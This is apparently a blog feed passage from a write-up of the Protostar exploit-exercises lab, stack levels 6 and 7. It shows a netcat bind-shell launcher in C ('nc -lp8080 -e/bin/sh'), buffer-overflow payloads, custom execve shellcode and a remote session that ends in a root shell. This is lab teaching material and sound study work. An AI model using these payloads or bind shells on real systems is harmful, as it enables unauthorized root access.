    <span class="kt">char</span> <span class="o">*</span><span class="n">args</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>  <span class="err">“</span><span class="n">nc</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="o">-</span><span class="n">lp8080</span><span class="err">”</span><span class="p">,</span> <span class="err">“</span><span class="o">-</span><span class="n">e</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">sh</span><span class="err">”</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span> <span class="mi">0</span> <span class="p">};</span>
    <span class="n">execve</span><span class="p">(</span><span class="err">“</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">nc</span><span class="err">”</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">envp</span><span class="p">);</span>
<span class="p">}</span></code></pre></div></p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> gcc ~/netcat.c -o ~/netcat
<span class="gp">$</span> <span class="nb">export </span><span class="nv">RUN</span><span class="o">=</span>/////////////////////////////////////home/user/netcat   <span class="c"># The slashes are similar to a NOP sled</span>
<span class="gp">$</span> ~/envaddr RUN
<span class="go">RUN is at address 0xbfffff9e</span>
<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffff9e <span class="p">|</span> ./stack6
<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췞���</span>
<span class="go">sh: 192.168.1.10: not found</span></code></pre></div></p>

<p><code>system()</code> doesn’t seem to be using the contents of our environmental variable. If we look at the environmental variables, though, we see that we were close enough: <code>RUN</code> is the next variable. We then adjust our estimate for the address of <code>RUN</code> by 20 bytes.</p>

<p><div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> env
<span class="go">…</span>
<span class="go">HOME=/home/user</span>
<span class="go">LOGNAME=user</span>
<span class="go">SSH_CONNECTION=192.168.1.7 49324 192.168.1.10 22</span>
<span class="go">RUN=/////////////////////////////////////home/user/netcat</span>
<span class="go">_=/usr/bin/env</span>
<span class="gp">$</span> /home/user/try-address.sh <span class="m">80</span> 0xb7ecefb0 0xb7ec50c0 0xbfffffbe <span class="p">|</span> ./stack6
<span class="go">input path please: got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��AAAAAAAAAAAA���P췳���&lt;/p&gt;</span>
<span class="go">&lt;waiting&gt;</span></code></pre></div>

Finally, through a remote machine:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~<span class="o">]</span><span class="nv">$ </span>nc 192.168.1.10 8080
<span class="go">whoami</span>
<span class="go">root</span></code></pre></div>

## Stack: Level 7
**Description** ([full](http://exploit-exercises.com/protostar/stack7)): Execute shellcode with further restrictions on the return address. Any address of the form `0xbxxxxxxx` raises an error.

### Overview

The return value of a function is usually stored in the `eax` register. The key to this level is the call to `return strdup(buf)`: this means we can find the buffer (e.g. our shellcode) in the `eax` register when `getpath()` returns.

The code restricts us from returning to any code on the bottom of the stack (`0xbxxxxxxx`) and advises us to return to the `.text` section. In particular, we&#8217;ll want to return to a `call eax` instruction, which will then call our shellcode.

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> objdump -M intel -d stack7 <span class="p">|</span> grep <span class="s2">&quot;call.*eax&quot;</span>
<span class="go">8048478:       ff 14 85 5c 96 04 08    call   DWORD PTR [eax*4+0x804965c]</span>
<span class="go">80484bf:       ff d0                   call   eax</span>
<span class="go">80485eb:       ff d0                   call   eax</span></code></pre></div>

If we play with the numbers like in earlier levels, we&#8217;ll find that 80 bytes are needed before the return address. Our buffer overflow will look like this:
<div class="highlight"><pre><code class="language-text" data-lang="text">Buffer start
      | ---------- Shellcode (n bytes) --------- |
      | -------- Padding (80 - n bytes) -------- |
      | -- Return address 0x80484bf (4 bytes) -- |
Buffer end (84 bytes total)</code></pre></div>

### Solution
In earlier levels, we found that opening a shell with `gets()`. However, we can still use it to validate our strategy:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/shell<span class="k">)$(</span>~/try-address.sh <span class="m">49</span> 0x080484bf<span class="k">)</span> <span class="p">|</span> wc -c
<span class="go">84</span>
<span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/shell<span class="k">)$(</span>~/try-address.sh <span class="m">49</span> 0x080484bf<span class="k">)</span> <span class="p">&amp;</span>gt<span class="p">;</span> /tmp/stack7shell
<span class="gp">$</span> gdb -q stack7
<span class="go">Reading symbols from /opt/protostar/bin/stack7...done.</span>
<span class="go">(gdb) run &amp;lt; /tmp/stack7shell</span>
<span class="go">Starting program: /opt/protostar/bin/stack7 &amp;lt; /tmp/stack7shell</span>
<span class="go">input path please: got path ����1�Ph//shh/bin��h-ilsP�̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��</span>
<span class="go">Executing new program: /bin/dash</span>

<span class="go">Program exited normally.</span></code></pre></div>

If we give it a shot with our `nc` shellcode, we&#8217;ll find the following error: `bin/sh: forward host lookup failed: Unknown host`. This occurs as a complication from having options passed into the `execve` call.

We can add another wrapper to the `netcat.c` used in Level 6 by writing our own shellcode. This shellcode will simply execute `/tmp/nc`, an alias for a compiled `netcat.c`. This file, in turn, calls netcat and listens via port 8080.

`~/sc-tmp-nc.asm`:
<div class="highlight"><pre><code class="language-nasm" data-lang="nasm"><span class="k">BITS</span> <span class="mi">32</span>

<span class="nf">xor</span> <span class="nb">eax</span><span class="p">,</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">push</span> <span class="mh">0x636e2f2f</span>         <span class="c1">; //nc</span>
<span class="nf">push</span> <span class="mh">0x706d742f</span>         <span class="c1">; /tmp</span>
<span class="nf">mov</span> <span class="nb">ebx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">push</span> <span class="nb">eax</span>
<span class="nf">mov</span> <span class="nb">edx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">push</span> <span class="nb">ebx</span>
<span class="nf">mov</span> <span class="nb">ecx</span><span class="p">,</span> <span class="nb">esp</span>
<span class="nf">mov</span> <span class="nb">al</span><span class="p">,</span> <span class="mi">11</span>              <span class="c1">; execve()</span>
<span class="nf">int</span> <span class="mh">0x80</span></code></pre></div>

<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span> nasm ~/sc-tmp-nc.asm
<span class="gp">$</span> gcc ~/netcat.c -o ~/netcat
<span class="gp">$</span> cp /home/user/netcat /tmp/nc
<span class="gp">$</span> cat /home/user/sc-tmp-nc <span class="p">|</span> wc -c
<span class="go">25</span>
<span class="go">got path AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA��</span>
<span class="gp">$</span> <span class="nb">echo</span> -ne <span class="k">$(</span>cat ~/sc-tmp-nc<span class="k">)$(</span>~/try-address.sh <span class="m">55</span> 0x080484bf<span class="k">)</span> <span class="p">|</span> ./stack7
<span class="go">input path please: got path 1�Ph//nch/tmp���̀AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�AAAAAAAAAAAA��</span>
<span class="go">&lt;waiting&gt;</span></code></pre></div>

On a remote machine:
<div class="highlight"><pre><code class="language-console" data-lang="console"><span class="gp">$</span><span class="o">[</span>louis@neutrino ~<span class="o">]</span><span class="nv">$ </span>nc 192.168.1.10 8080
<span class="go">whoami</span>
<span class="go">root</span></code></pre></div>
</waiting></waiting>
]]></content>
  </entry>
  
</feed>
